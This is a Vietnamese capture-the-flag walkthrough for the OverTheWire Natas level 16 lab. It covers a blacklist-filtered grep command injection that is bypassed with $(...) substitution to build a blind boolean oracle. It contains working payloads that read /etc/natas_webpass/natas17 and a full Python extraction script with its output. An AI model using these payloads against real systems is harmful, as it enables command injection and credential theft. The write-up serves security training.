# Level 16 -> Level 17

For security reasons, we now filter even more on certain characters

Find words containing: [        ] [Search]

Output:
<pre>
</pre>

---

## 1. THÔNG TIN TRUY CẬP (DÙNG PASSWORD TÌM ĐƯỢC TỪ NATAS 15)

- **URL**: `http://natas16.natas.labs.overthewire.org`
- **Username**: `natas16`
- **Password**: `Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb`
- **Giao thức xác thực**: HTTP Basic Authentication

---

## 2. THỬ THÁCH & KIẾN THỨC NỀN TẢNG CỦA LEVEL 16

### Thử thách
Tương tự như Level 9 và Level 10, trang web cung cấp một công cụ tìm kiếm từ ngữ trong cuốn từ điển `dictionary.txt` bằng lệnh `grep`.
Tuy nhiên, giao diện có thêm cảnh báo:
*"For security reasons, we now filter even more on certain characters"* (Vì lý do bảo mật, bây giờ chúng tôi lọc nhiều ký tự hơn nữa).

Bên dưới biểu mẫu có liên kết **`View sourcecode`**.

### Phân tích mã nguồn PHP (`index-source.html`)
Mở mã nguồn trang web, ta quan sát cơ chế lọc đầu vào và câu lệnh thực thi hệ thống:

```php
<?
ini_set('pcre.jit', 0);
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

### Manh mối & Kiến thức cốt lõi: Tấn công Blind OS Command Injection qua Command Substitution (`$(...)`)

1. **Phân tích danh sách đen (Blacklist)**:
   - Biểu thức chính quy `preg_match('/[;|&`\'"]/', $key)` chặn hầu hết các ký tự nối lệnh quen thuộc:
     - `;` (phân tách nhiều câu lệnh)
     - `|` (chuyển hướng luồng dữ liệu pipe)
     - `&` (chạy ngầm trong nền hoặc toán tử AND)
     - `` ` `` (backtick thực thi lệnh con)
     - `'` và `"` (dấu nháy đơn và nháy kép)
   - Nếu nhập bất kỳ ký tự nào trong danh sách trên, hệ thống sẽ báo lỗi ngay: *"Input contains an illegal character!"*.

2. **Kẽ hở bảo mật: Cú pháp Command Substitution `$(...)` trong Bash**:
   - Lập trình viên đã bỏ sót hai ký tự cực kỳ quan trọng trong Bash: dấu **`$`** và cặp dấu ngoặc đơn **`()`**.
   - Trong Linux shell (Bash), cú pháp `$(câu_lệnh)` được gọi là **Command Substitution** (Thế chỗ câu lệnh). Shell sẽ thực thi câu lệnh con nằm trong ngoặc trước, sau đó lấy toàn bộ kết quả đầu ra (output) để thay thế vào dòng lệnh chính.
   - Thêm vào đó, trong hàm `passthru()`, biến `$key` được đặt bên trong dấu nháy kép:
     `passthru("grep -i \"$key\" dictionary.txt");`
   - Theo quy tắc của Bash, các biểu thức `$()` nằm trong dấu nháy kép **vẫn được thực thi bình thường** trước khi lệnh ngoài cùng chạy.

3. **Kỹ thuật tấn công mù (Blind Command Injection Oracle)**:
   - Mặc dù ta có thể thực thi lệnh đọc mật khẩu `/etc/natas_webpass/natas17` bằng `$(grep ... /etc/natas_webpass/natas17)`, nhưng kết quả trả về của nó lại bị nhét vào bên trong lệnh `grep` tìm kiếm trong `dictionary.txt`. Vì mật khẩu của `natas17` là một chuỗi ngẫu nhiên không có trong từ điển, nó sẽ không được in trực tiếp ra màn hình.
   - Để khắc phục, ta xây dựng một cơ chế suy luận Đúng/Sai (**Boolean Oracle**) bằng cách ghép lệnh con với một từ chắc chắn có mặt trong từ điển `dictionary.txt`, ví dụ từ: **`doomed`** (hoặc `African`):
     ```bash
     $(grep <mẫu_cần_thử> /etc/natas_webpass/natas17)doomed
     ```
   - **Cơ chế hoạt động**:
     - **Trường hợp ĐÚNG (Ký tự / mẫu khớp với mật khẩu)**:
       - Lệnh con `grep` tìm thấy kết quả và trả về chuỗi mật khẩu (ví dụ `KLd...`).
       - Lệnh ngoài cùng sẽ trở thành: `grep -i "KLd...doomed" dictionary.txt`.
       - Chuỗi `KLd...doomed` hiển nhiên không có trong từ điển $\rightarrow$ Kết quả màn hình **RỖNG (không xuất hiện từ `doomed`)**.
     - **Trường hợp SAI (Ký tự / mẫu không khớp)**:
       - Lệnh con `grep` không tìm thấy gì và trả về chuỗi rỗng `""`.
       - Lệnh ngoài cùng sẽ trở thành: `grep -i "doomed" dictionary.txt`.
       - Từ `doomed` có sẵn trong từ điển $\rightarrow$ Kết quả màn hình **XUẤT HIỆN từ `doomed`**.
   - **Quy tắc phán đoán Boolean**:
     - Màn hình **KHÔNG CÓ từ `doomed`** $\rightarrow$ Kết quả: **ĐÚNG (TRUE)**.
     - Màn hình **XUẤT HIỆN từ `doomed`** $\rightarrow$ Kết quả: **SAI (FALSE)**.

4. **Chiến lược khai thác 2 bước tối ưu**:
   - **Bước 1 (Lọc tập ký tự)**: Kiểm tra trong 62 ký tự alphanumeric (`a-z`, `A-Z`, `0-9`), ký tự nào thực sự có mặt trong mật khẩu:
     `$(grep <ký_tự> /etc/natas_webpass/natas17)doomed`
     Việc này giúp rút gọn danh sách cần dò từ 62 xuống chỉ còn ~20-25 ký tự.
   - **Bước 2 (Dò tuần tự từng vị trí)**: Với tập ký tự đã lọc, ta dùng ký tự neo đầu dòng `^` trong regex của `grep` để dò từng ký tự từ trái sang phải:
     `$(grep ^K /etc/natas_webpass/natas17)doomed`
     `$(grep ^KL /etc/natas_webpass/natas17)doomed`
     `$(grep ^KLd /etc/natas_webpass/natas17)doomed`
     ... cho đến khi hoàn thành toàn bộ 32 ký tự!

---

## 3. CÔNG CỤ CẦN DÙNG

- **Trình duyệt Web (Chrome, Edge, Firefox)**: Thử nghiệm thủ công các câu hỏi Boolean với payload `$()`.
- **Python**: Viết script tự động hóa lọc ký tự và trích xuất toàn bộ mật khẩu qua HTTP request (dùng thư viện có sẵn `urllib`).
- **Burp Suite**: Bắt và quan sát gói tin GET.

---

## 4. CÁC BƯỚC THỰC HIỆN ĐỂ LẤY PASSWORD LEVEL 17

### Bước 1: Thử nghiệm thủ công trên trình duyệt để kiểm chứng Boolean Oracle

- Mở trình duyệt và truy cập đường dẫn:
  ```text
  http://natas16.natas.labs.overthewire.org
  ```
  Đăng nhập với tài khoản:
  - **User**: `natas16`
  - **Pass**: `Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb`

- **Test 1**: Kiểm tra từ khóa bình thường:
  - Nhập vào ô tìm kiếm:
    ```text
    doomed
    ```
  - Bấm nút **Search** $\rightarrow$ Màn hình hiển thị:
    ```text
    Output:
    doomed
    ```

- **Test 2**: Thử nghiệm mẫu SAI (Ký tự không khớp):
  - Nhập vào ô tìm kiếm:
    ```text
    $(grep test /etc/natas_webpass/natas17)doomed
    ```
  - Bấm nút **Search** $\rightarrow$ Vì từ `test` không khớp trong mật khẩu, lệnh con trả về rỗng, màn hình vẫn hiển thị từ:
    ```text
    Output:
    doomed
    ```

- **Test 3**: Thử nghiệm mẫu ĐÚNG (Ký tự có khớp):
  - Nhập vào ô tìm kiếm:
    ```text
    $(grep a /etc/natas_webpass/natas17)doomed
    ```
  - Bấm nút **Search** $\rightarrow$ Vì ký tự `a` có xuất hiện trong mật khẩu, lệnh con trả về chuỗi mật khẩu, khiến lệnh ngoài cùng không tìm thấy kết quả và màn hình trở nên **trống rỗng**:
    ```text
    Output:
    ```

$\Rightarrow$ Cơ chế phán đoán Đúng/Sai qua Blind OS Command Injection đã được xác thực thành công!

---

### Bước 2: Tự động hóa trích xuất mật khẩu bằng Python Script (Khuyên dùng)

Do mật khẩu dài 32 ký tự và có phân biệt chữ hoa, chữ thường, ta sử dụng một kịch bản Python ngắn gọn để tự động hóa toàn bộ quá trình.

1. Mở tệp kịch bản [src/solve16.py](src/solve16.py) trong thư mục `src/` (nội dung chi tiết bên dưới):

```python
import urllib.request
import urllib.parse
import base64
import string
import time

url = "http://natas16.natas.labs.overthewire.org/"
credentials = base64.b64encode(b"natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb").decode("ascii")

def check_match(pattern):
    # Payload ghép lệnh con $(grep ...) với từ "doomed"
    query = f"$(grep {pattern} /etc/natas_webpass/natas17)doomed"
    params = urllib.parse.urlencode({"needle": query})
    req = urllib.request.Request(f"{url}?{params}")
    req.add_header("Authorization", f"Basic {credentials}")
    
    for attempt in range(3):
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                content = resp.read().decode("utf-8")
                # Nếu từ "doomed" BIẾN MẤT khỏi kết quả -> Khớp thành công (TRUE)!
                return "doomed" not in content
        except Exception:
            time.sleep(1)
    return False

# BƯỚC 1: Lọc tập ký tự có trong mật khẩu
all_chars = string.ascii_letters + string.digits
filtered = ""
print("[*] Đang lọc các ký tự có trong mật khẩu của natas17...")

for c in all_chars:
    if check_match(c):
        filtered += c
        print(f" -> Ký tự hợp lệ: {c}")

print(f"\n[+] Tập ký tự rút gọn ({len(filtered)} ký tự): {filtered}")

# BƯỚC 2: Dò tuần tự từng vị trí từ trái sang phải (32 ký tự)
password = ""
print("\n[*] Đang dò tìm từng vị trí mật khẩu...")

for i in range(1, 33):
    found = False
    for c in filtered:
        candidate = password + c
        # Dùng ký tự ^ để neo vào đầu chuỗi mật khẩu
        if check_match(f"^{candidate}"):
            password = candidate
            print(f"Vị trí {i:02d}: {c} -> Mật khẩu hiện tại: {password}")
            found = True
            break
    if not found:
        print(f"[-] Không tìm thấy ký tự tại vị trí {i}!")
        break

print(f"\n[+] Mật khẩu hoàn chỉnh của natas17 là: {password}")
```

2. Mở Terminal (PowerShell hoặc Command Prompt) tại thư mục `Natas/` và chạy script:

```powershell
python src/solve16.py
```

4. Quan sát script tự động lọc tập ký tự và dò ra trọn vẹn 32 ký tự:
```text
[*] Đang lọc các ký tự có trong mật khẩu của natas17...
 -> Ký tự hợp lệ: a
 -> Ký tự hợp lệ: b
...
[+] Tập ký tự rút gọn (26 ký tự): abdfhjkotuxAGIKLMTVYZ35678

[*] Đang dò tìm từng vị trí mật khẩu...
Vị trí 01: K -> Mật khẩu hiện tại: K
Vị trí 02: L -> Mật khẩu hiện tại: KL
Vị trí 03: d -> Mật khẩu hiện tại: KLd
...
Vị trí 32: x -> Mật khẩu hiện tại: KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx

[+] Mật khẩu hoàn chỉnh của natas17 là: KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx
```

---

### Bước 3: Kiểm tra thử nghiệm qua Burp Suite (Tùy chọn)

- **Bước 1**: Mở trình duyệt tích hợp của Burp Suite (`Open browser`) và truy cập đường dẫn:
  ```text
  http://natas16.natas.labs.overthewire.org
  ```
  Đăng nhập với tài khoản:
  - **User**: `natas16`
  - **Pass**: `Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb`

- **Bước 2**: Trên ô tìm kiếm, nhập `$(grep ^K /etc/natas_webpass/natas17)doomed` và bấm **Search**.
- **Bước 3**: Trong Burp Suite, vào tab **`HTTP history`** $\rightarrow$ chọn request vừa gửi $\rightarrow$ chuột phải chọn **`Send to Repeater`**.
- **Bước 4**: Tại tab **`Repeater`**, bấm nút **Send** và quan sát thẻ `<pre>` trong Response:
  ```html
  Output:
  <pre>
  </pre>
  ```
  Thẻ `<pre>` hoàn toàn trống rỗng, xác nhận ký tự đầu tiên của mật khẩu chính xác là `K`.

---

## 5. KẾT QUẢ / MẬT KHẨU LEVEL 17

```text
Password natas17: [KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx]
```
